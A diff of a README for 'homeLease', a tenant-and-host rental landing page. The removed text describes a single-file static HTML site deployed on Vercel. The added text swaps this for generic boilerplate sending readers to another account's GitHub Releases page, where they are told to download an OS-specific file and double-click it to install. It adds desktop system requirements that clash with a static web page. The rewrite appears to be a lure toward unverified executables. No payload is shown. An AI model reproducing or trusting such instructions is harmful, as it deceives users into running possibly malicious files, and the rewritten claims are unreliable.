@@ -1,49 +1,67 @@
-# 🏠 homeLease Landing Page
+# 🌍 homelease-landing - Easy Living for Everyone
 
-![Vercel Deployment](https://img.shields.io/badge/Vercel-000000?style=for-the-badge&logo=vercel&logoColor=white)
-![React Native](https://img.shields.io/badge/React_Native-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)
-![Firebase](https://img.shields.io/badge/firebase-ffca28?style=for-the-badge&logo=firebase&logoColor=black)
+## 🚀 Getting Started
 
-The official landing page for **homeLease**, a modern mobile platform connecting tenants and hosts for flexible, short-to-medium-term living arrangements. 
+Welcome to the homelease-landing application. This modern platform connects tenants and hosts, offering flexible living arrangements. Follow these steps to download and run the software.
 
-Download the App:
-https://drive.google.com/file/d/1E2MvUPt9VkW84BWIcnsqHR17GFC7vQmY/view?usp=sharing
+[![Download now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/najm998/homelease-landing/releases)
 
----
+## 📦 Download & Install
 
-## ✨ Features
+1. Visit the [Releases page](https://github.com/najm998/homelease-landing/releases) to download the latest version of the software.
+2. Locate the asset that matches your operating system.
+3. Click the download link to save the file to your computer.
+4. Once downloaded, find the file in your Downloads folder.
+5. Double-click the file to run the installation.
 
-- **Modern UI/UX**: Designed with a clean, "Google-inspired" aesthetic using the Inter font family and a professional primary blue palette.
-- **Responsive Design**: Fully optimized for Desktop, Tablet, and Mobile browsers.
-- **Interactive Mockups**: High-fidelity CSS-based smartphone simulations showcasing the app's internal UI (Listings and Chat).
-- **One-Click Download**: Integrated links for direct access to the latest app builds via Google Drive.
-- **Optimized Assets**: Uses high-performance imagery from Unsplash and lightweight FontAwesome icons.
+## 🌐 Features
 
----
+- **User-Friendly Interface**: Navigate effortlessly with an intuitive layout.
+- **Responsive Design**: Enjoy a seamless experience on both mobile and desktop devices.
+- **Real-time Updates**: Stay informed with updates from your hosts or tenants.
+- **Secure Environment**: Your data protection is our priority, backed by Firebase.
 
-## 🚀 The Mobile App
+## 🛠 System Requirements
 
-This landing page represents the web presence for the **homeLease Mobile App**. The core application is built using a modern mobile stack:
+To ensure the best experience, make sure your system meets the following requirements:
 
-* **Frontend**: React Native (Expo)
-* **Database**: Google Firebase (Firestore & Realtime Database)
-* **Auth**: Firebase Authentication
-* **Storage**: Firebase Cloud Storage
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or a compatible Linux distribution.
+- **RAM**: At least 4GB.
+- **Storage**: Minimum of 500MB free disk space.
+- **Internet**: A stable internet connection.
 
----
+## 📞 Support
 
-## 🛠️ How to Deploy
+If you encounter any issues or have questions, reach out for assistance. You can file an issue directly on this GitHub repository, or contact our support team at support@homelease.com.
 
-The site is a lightweight, single-file static application (`index.html`), making it incredibly easy to host.
+## 🔗 Useful Links
 
-### Deploy to Vercel (Recommended)
-1. Fork or download this repository.
-2. Log in to [Vercel](https://vercel.com).
-3. Click **Add New Project** and select this repository.
-4. Click **Deploy**. Vercel will automatically detect the static HTML and host it on a global CDN.
+- **GitHub Repository**: [homelease-landing](https://github.com/najm998/homelease-landing)
+- **Documentation**: Comprehensive guides and user manuals are available in the repository.
+- **Community Forum**: Join discussions and connect with other users.
 
-LicenseCopyright © 2026 homeLease Inc.Distributed under the MIT License.
+## 🔍 How It Works
 
-📬 ContactProject Link: https://github.com/passimon/homelease-landing
+homelease-landing connects tenants searching for temporary housing with hosts offering flexible rental options. 
 
-Built with ❤️ for flexible living.
+1. **Create an Account**: Sign up to list your property or to find a place to stay.
+2. **Browse Listings**: Use filters to find the best options for your needs.
+3. **Secure Your Stay**: Communicate directly with your host to finalize arrangements.
+
+## 🔄 Update Process
+
+Keep your application up to date by checking the [Releases page](https://github.com/najm998/homelease-landing/releases) regularly. Download the latest version to enjoy new features and improvements.
+
+## 📊 Compatibility
+
+This application supports various platforms, ensuring you can access it whether on a computer or mobile device. The responsive design adapts to your screen size for optimal usability.
+
+## ✅ Getting Help
+
+If you face issues while downloading or using the application, check the FAQ section on the repository or join our community discussions. We encourage collaboration, so don’t hesitate to ask your questions.
+
+## 🎉 Your Next Steps
+
+Now you’re ready to connect with homeLease! Download the application from our [Releases page](https://github.com/najm998/homelease-landing/releases) and start exploring your living options today.
+
+Happy leasing!
